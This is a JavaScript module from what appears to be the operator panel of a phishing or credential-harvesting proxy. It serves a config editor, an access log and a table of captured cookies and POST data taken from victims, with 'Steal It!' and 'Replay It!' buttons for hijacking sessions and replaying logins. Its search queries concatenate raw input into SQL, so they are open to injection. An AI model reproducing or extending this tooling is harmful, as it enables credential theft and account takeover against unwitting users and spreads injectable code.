mime_file = fs.readFileSync("./wwwroot/mimetypes.json");
mime_types = JSON.parse(mime_file);
module.exports = {
  redirect: function(redirect_path, humble_response) {
  //  humble_response.write(replace(fs.readFileSync("./resources/redirect_top.html"), "\n", ""));
  //  humble_response.write(redirect_path);
  //  humble_response.write(replace(fs.readFileSync("./resources/redirect_bottom.html"), "\n", ""));
  // humble_response.end()
      humble_response.setHeader("location", redirect_path)
      humble_response.statusCode = 302
      humble_response.end()
  },

  deliver_file: function(file_name, humble_response) {
      try {
        extention = file_name.split('.')[1]
        mime_type = mime_types[extention]
        humble_response.setHeader('content-type', mime_type)
        humble_response.write(fs.readFileSync("./wwwroot/" + file_name));
        humble_response.end()
      } catch(err) {
        console.log(fail + "Coundn't Find  File in wwwroot: " + file_name)
        humble_response.end()
      }
  },

  set_cookie: function(cookie, humble_response) {
      try {
	admin_config.set_admin.switch = false
        humble_response.setHeader("set-cookie", cookie)
	fs.writeFileSync('./admin_config.json', JSON.stringify(admin_config, null, 4));
        humble_response.write(replace(fs.readFileSync("./resources/set_cookie.html"), "\n", ""));
        humble_response.end()
      } catch(err) {
        humble_response.write("problem with config: " + err)
        humble_response.end()
      }
  },

  adminConfig: function(victim_request, humble_response) {
    if (http_method == 'POST') {
      try {
        config = JSON.parse(decodeURIComponent(postData.split('=')[1]))
	fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));
        console.log(success + "Updated Config File: " + decodeURIComponent(postData))
        humble_response.write(fs.readFileSync("./resources/config_page_top.html"));
        humble_response.write(JSON.stringify(config));
        humble_response.write(fs.readFileSync("./resources/config_page_bottom.html"));
        humble_response.end()
      } catch(err) {
        humble_response.write("problem with config: " + err)
        humble_response.end()
      }
    } else {
      humble_response.write(fs.readFileSync("./resources/config_page_top.html"));
      humble_response.write(JSON.stringify(config));
      humble_response.write(fs.readFileSync("./resources/config_page_bottom.html"));
      humble_response.end()
    }
  },

  accessLog: function(victim_request, humble_response) {
    humble_response.write(fs.readFileSync("./resources/log_page_top.html"));
    humble_response.write(fs.readFileSync("./resources/banner.txt"));
    humble_response.write(replace(fs.readFileSync("./logs/access.log"), "\n", "<br>"));
    humble_response.write(fs.readFileSync("./resources/log_page_bottom.html"));
    humble_response.end()
  },

  credsLog: function(victim_request, humble_response) {
    humble_response.write(fs.readFileSync("./resources/credz_page_top.html"));
    //humble_response.write(fs.readFileSync("./resources/banner.txt"));
    //humble_response.write(replace(fs.readFileSync("./logs/creds.log"), "\n", "<br>"));
    humble_response.write("<table>\n<thead>\n<tr>\n<th class='time'>TimeStamp</th>\n<th class='domain'>Domain</th>\n<th class='url'>URL</th>\n<th class='data'>Data</th>\n<th class='replay'>Replay</th>\n</tr>\n</thead>\n<tbody>");
    db.serialize(function() {
      if (http_method == 'POST') {
        var search_options = decodeURIComponent(postData).split('&')
        var sql = "SELECT * FROM cookies WHERE timestamp LIKE '%" + search_options[0].split('=')[1] + "%' AND domain LIKE '%" + search_options[1].split('=')[1] + "%' AND cookie LIKE '%" + search_options[3].split('=')[1] + "%'" 
      } else { 
        var sql = "SELECT * FROM cookies"
      } 
       db.each(sql, function(err, row) {
        humble_response.write("<tr>\n\t<td>" + row.timestamp + "</td>\n\t<td> " + row.domain + "</td>\n\t<td></td>\n\t<td>" + row.cookie.replace(/"/g,"") + "</td>\n\t<td><button onclick='stealCookie(this)'>Steal It!</button></td>\n</tr>\n");
      });
      if (http_method == 'POST') {
        var search_options = decodeURIComponent(postData).split('&')
        var sql = "SELECT * FROM posts WHERE timestamp LIKE '%" + search_options[0].split('=')[1] + "%' AND domain LIKE '%" + search_options[1].split('=')[1] + "%' AND url LIKE '%" + search_options[2].split('=')[1] + "%' AND post LIKE '%" + search_options[3].split('=')[1] + "%'" 
      } else { 
        var sql = "SELECT * FROM posts"
      } 
      db.each(sql, function(err, row) {
        humble_response.write("<tr>\n\t<td>" + row.timestamp + "</td>\n\t<td> " + row.domain + "</td>\n\t<td>" + row.url + "</td>\n\t<td>" + row.post + "</td>\n\t<td><button onclick='replayPost(this)'>Replay It!</button></td>\n</tr>\n");
      }, function(){
        humble_response.write("</tbody></table>\n");
        humble_response.write(fs.readFileSync("./resources/credz_page_bottom.html"));
        humble_response.end()
      });
     });
  }
}
